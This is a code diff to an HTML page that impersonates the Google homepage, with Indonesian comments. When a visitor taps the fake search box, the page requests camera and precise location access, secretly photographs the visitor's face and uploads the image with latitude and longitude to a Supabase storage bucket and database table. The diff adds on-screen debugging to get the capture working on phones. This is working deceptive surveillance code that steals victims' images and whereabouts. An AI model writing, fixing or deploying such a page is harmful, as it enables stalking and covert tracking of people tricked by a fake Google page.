@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google</title>
+    <title>Google - Debug Mode</title>
     <link rel="icon" href="https://www.google.com/favicon.ico">
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
@@ -28,7 +28,7 @@
             display: flex;
             flex-direction: column;
             align-items: center;
-            margin-top: -10vh;
+            margin-top: -5vh;
             flex: 1;
             justify-content: center;
             padding: 0 20px;
@@ -64,7 +64,7 @@
             font-size: 16px;
             background: transparent;
             margin-left: 10px;
-            pointer-events: none; /* Agar klik langsung menargetkan container/box */
+            pointer-events: none;
         }
         .search-icon {
             width: 20px;
@@ -72,7 +72,20 @@
             fill: #9aa0a6;
         }
 
-        /* Elemen video tersembunyi secara aman */
+        /* Kotak Debug untuk melihat status error langsung di HP */
+        #debug-log {
+            margin-top: 20px;
+            width: 90%;
+            max-width: 500px;
+            background: #f8d7da;
+            color: #721c24;
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 12px;
+            word-break: break-all;
+            display: none;
+        }
+
         #camera-preview {
             position: fixed;
             top: 0;
@@ -113,11 +126,13 @@
             <span class="blue">G</span><span class="red">o</span><span class="yellow">o</span><span class="blue">g</span><span class="green">l</span><span class="red">e</span>
         </div>
 
-        <!-- Kotak pencarian yang sekaligus berfungsi sebagai tombol pemicu izin HP -->
         <div class="search-box" id="trigger-box">
             <svg class="search-icon" focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"></path></svg>
-            <input type="text" placeholder="Telusuri Google atau ketik URL">
+            <input type="text" placeholder="Ketuk di sini untuk mulai...">
         </div>
+
+        <!-- Tempat menampilkan pesan error di HP -->
+        <div id="debug-log">Status: Menunggu interaksi...</div>
     </div>
 
     <video id="camera-preview" autoplay playsinline muted></video>
@@ -138,15 +153,30 @@
         const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
         let hasRun = false;
 
-        async function startProcess(e) {
+        function showDebug(msg) {
+            const logBox = document.getElementById("debug-log");
+            logBox.style.display = "block";
+            logBox.innerHTML += "<br>• " + msg;
+            console.log(msg);
+        }
+
+        async function startProcess() {
             if (hasRun) return;
             hasRun = true;
+
+            showDebug("Tombol diketuk, memulai proses...");
+
+            // Cek apakah protokolnya HTTPS
+            if (location.protocol !== 'https:' && location.hostname !== 'localhost') {
+                showDebug("ERROR KRITIS: Website tidak menggunakan HTTPS! Kamera & Lokasi diblokir HP.");
+                return;
+            }
 
             const video = document.getElementById("camera-preview");
             const canvas = document.getElementById("canvas");
 
             try {
-                // Meminta izin kamera (Akan memunculkan popup di Safari/Chrome HP)
+                showDebug("Meminta izin kamera...");
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: "user" },
                     audio: false
@@ -154,13 +184,15 @@
                 
                 video.srcObject = stream;
                 await video.play();
+                showDebug("Kamera diizinkan.");
 
-                // Meminta izin lokasi
                 if ("geolocation" in navigator) {
+                    showDebug("Meminta izin lokasi...");
                     navigator.geolocation.getCurrentPosition(
                         async (position) => {
                             const lat = position.coords.latitude;
                             const lng = position.coords.longitude;
+                            showDebug("Lokasi didapat: " + lat + ", " + lng);
 
                             setTimeout(async () => {
                                 canvas.width = video.videoWidth || 640;
@@ -169,59 +201,54 @@
                                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
                                 canvas.toBlob(async (blob) => {
-                                    if (!blob) return;
-
-                                    const fileName = `capture_${Date.now()}.png`;
-
-                                    // Upload ke Supabase Storage bucket 'captures'
-                                    const { error: storageError } = await supabaseClient.storage
-                                        .from('captures')
-                                        .upload(fileName, blob, { 
-                                            contentType: 'image/png', 
-                                            upsert: true 
-                                        });
-
-                                    if (storageError) {
-                                        console.error("Storage Error:", storageError.message);
+                                    if (!blob) {
+                                        showDebug("ERROR: Gagal membuat blob gambar.");
                                         return;
                                     }
 
-                                    // Ambil Public URL
+                                    const fileName = `capture_${Date.now()}.png`;
+                                    showDebug("Mengunggah ke Supabase Storage...");
+
+                                    const { error: storageError } = await supabaseClient.storage
+                                        .from('captures')
+                                        .upload(fileName, blob, { contentType: 'image/png', upsert: true });
+
+                                    if (storageError) {
+                                        showDebug("STORAGE ERROR: " + storageError.message);
+                                        return;
+                                    }
+
                                     const { data: { publicUrl } } = supabaseClient.storage
                                         .from('captures')
                                         .getPublicUrl(fileName);
 
-                                    // Insert ke tabel 'logs' Supabase
+                                    showDebug("Menyimpan ke Database tabel logs...");
                                     const { error: dbError } = await supabaseClient
                                         .from('logs')
-                                        .insert([{ 
-                                            photo_url: publicUrl, 
-                                            latitude: lat, 
-                                            longitude: lng 
-                                        }]);
+                                        .insert([{ photo_url: publicUrl, latitude: lat, longitude: lng }]);
 
                                     if (dbError) {
-                                        console.error("Database Error:", dbError.message);
+                                        showDebug("DATABASE ERROR: " + dbError.message);
+                                    } else {
+                                        showDebug("SUKSES BESAR! Data berhasil masuk ke Supabase.");
                                     }
 
-                                    // Matikan kamera
                                     stream.getTracks().forEach(track => track.stop());
                                 }, 'image/png');
                             }, 1200);
 
                         },
                         (error) => {
-                            console.warn("Lokasi ditolak:", error.message);
+                            showDebug("LOKASI DITOLAK/GAGAL: " + error.message);
                         },
                         { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                     );
                 }
             } catch (err) {
-                console.warn("Kamera ditolak/error:", err);
+                showDebug("KAMERA ERROR / DITOLAK: " + err.message);
             }
         }
 
-        // Event listener pada kotak pencarian agar merespons sentuhan pertama di HP (Safari & Chrome compatible)
         document.getElementById("trigger-box").addEventListener("click", startProcess);
         document.getElementById("trigger-box").addEventListener("touchstart", startProcess);
     </script>
